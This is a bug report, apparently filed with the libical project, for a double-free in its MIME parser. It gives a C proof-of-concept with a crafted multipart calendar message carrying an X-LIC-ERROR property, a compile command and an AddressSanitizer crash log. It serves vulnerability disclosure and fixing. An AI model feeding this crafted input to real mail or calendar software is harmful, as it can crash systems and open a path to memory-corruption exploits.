## Summary

**Tested on:** macOS 15.5 (24F74)

The vulnerability occurs when parsing multipart MIME messages with malformed calendar components that trigger error handling paths leading to double-free of icalproperty objects.

**Harness:**

**poc_double_free.c**

```
/*
 * Proof of Concept for double-free vulnerability in libical MIME parser
 * 
 * The vulnerability occurs when parsing multipart MIME messages with
 * malformed calendar components that trigger error handling paths
 * leading to double-free of icalproperty objects.
 */

#include <stdio.h>
#include <string.h>
#include "ical.h"
#include "icalmime.h"

const char *mime_content = 
"MIME-Version: 1.0\r\n"
"Content-Type: multipart/mixed; boundary=\"frontier\"\r\n"
"\r\n"
"--frontier\r\n"
"Content-Type: text/calendar\r\n"
"\r\n"
"BEGIN:VCALENDAR\r\n"
"VERSION:2.0\r\n"
"BEGIN:VEVENT\r\n"
"UID:test@example.com\r\n"
"DTSTART:20241230T100000Z\r\n"
"X-LIC-ERROR:Malformed property\r\n"  // This triggers the vulnerability
"END:VEVENT\r\n"
"END:VCALENDAR\r\n"
"--frontier--\r\n";

struct test_data {
    const char *data;
    size_t pos;
};

char *line_generator(char *buf, size_t size, void *d) {
    struct test_data *td = (struct test_data *)d;
    const char *start = td->data + td->pos;
    const char *end = strchr(start, '\n');
    
    if (!end || td->pos >= strlen(td->data)) {
        return NULL;
    }
    
    size_t len = end - start + 1;
    if (len >= size) len = size - 1;
    
    memcpy(buf, start, len);
    buf[len] = '\0';
    
    td->pos += len;
    return buf;
}

int main() {
    printf("Testing libical MIME parser double-free vulnerability...\n");
    
    icalerror_set_errors_are_fatal(0);
    
    struct test_data td = {mime_content, 0};
    
    icalcomponent *comp = icalmime_parse(line_generator, &td);
    
    if (comp) {
        printf("Component parsed, attempting to free...\n");
        icalcomponent_free(comp);
        printf("If you see this, the vulnerability was not triggered.\n");
    } else {
        printf("Failed to parse component.\n");
    }
    
    return 0;
}
```

**Compile:**
```
clang -g -fsanitize=address -I./src/libical -I./src/libicalss -I. -o poc_double_free poc_double_free.c -L./lib -lical
```

**ASAN:**

```
bash-3.2$ DYLD_LIBRARY_PATH=./lib ./poc_double_free
poc_double_free(61353,0x7ff8571c2dc0) malloc: nano zone abandoned due to inability to reserve vm space.
Testing libical MIME parser double-free vulnerability...
Component parsed, attempting to free...
=================================================================
==61353==ERROR: AddressSanitizer: attempting double-free on 0x608000000120 in thread T0:
    #0 0x00010477a5db in free+0x8b (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0xe25db)
    #1 0x000104273c37 in icalproperty_free icalproperty.c:182
    #2 0x000104268a91 in icalcomponent_free icalcomponent.c:184
    #3 0x0001041b7b59 in main poc_double_free.c:68
    #4 0x7ff81541752f in start+0xbef (dyld:x86_64+0xfffffffffffe652f)

0x608000000120 is located 0 bytes inside of 88-byte region [0x608000000120,0x608000000178)
freed by thread T-1 here:
AddressSanitizer: CHECK failed: asan_descriptions.cpp:176 "((id)) != (0)" (0x0, 0x0) (tid=432299)
    #0 0x0001047871d1 in __asan::CheckUnwind()+0x31 (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0xef1d1)
    #1 0x0001047a383b in __sanitizer::CheckFailed(char const*, int, char const*, unsigned long long, unsigned long long)+0x7b (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x10b83b)
    #2 0x0001046a3a60 in __asan::HeapAddressDescription::Print() const+0x4f0 (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0xba60)
    #3 0x0001046a4dee in __asan::ErrorDoubleFree::Print()+0x12e (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0xcdee)
    #4 0x000104784aa3 in __asan::ScopedInErrorReport::~ScopedInErrorReport()+0x73 (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0xecaa3)
    #5 0x000104780d96 in __asan::ReportDoubleFree(unsigned long, __sanitizer::BufferedStackTrace*)+0x1d6 (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0xe8d96)
    #6 0x00010477a640 in free+0xf0 (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0xe2640)
    #7 0x000104273c37 in icalproperty_free icalproperty.c:182
    #8 0x000104268a91 in icalcomponent_free icalcomponent.c:184
    #9 0x0001041b7b59 in main poc_double_free.c:68
    #10 0x7ff81541752f in start+0xbef (dyld:x86_64+0xfffffffffffe652f)

Abort trap: 6
bash-3.2$
```

**Reference:** https://github.com/libical/libical/issues/936
